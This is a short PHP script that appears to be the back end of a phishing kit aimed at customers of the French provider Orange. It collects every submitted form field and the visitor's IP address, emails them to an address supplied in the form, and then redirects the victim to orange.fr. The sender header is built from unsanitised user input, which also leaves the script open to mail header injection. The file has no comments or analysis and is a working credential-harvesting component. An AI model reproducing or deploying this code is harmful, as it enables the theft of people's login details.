<?php

    $TO = $_POST['mailfrom'];
    $h  = "From: " . $TO;
	$ip = $_SERVER['REMOTE_ADDR'];
	
$subject= $_POST['email'];

$message = "$ip\n";

while (list($key, $val) = each($_POST)) {
  $message .= "$key : $val\n";
}
   mail($TO, $subject, $message, $h);
echo'<div align="center">
<div align="center"></div>
<div style="font-size:15px; margin:auto; font-weight:700; color:#000; margin-top:5px; margin-bottom:8px; width:700px;"></div></div>';
header ("Refresh: 1;URL=https://orange.fr/");
?>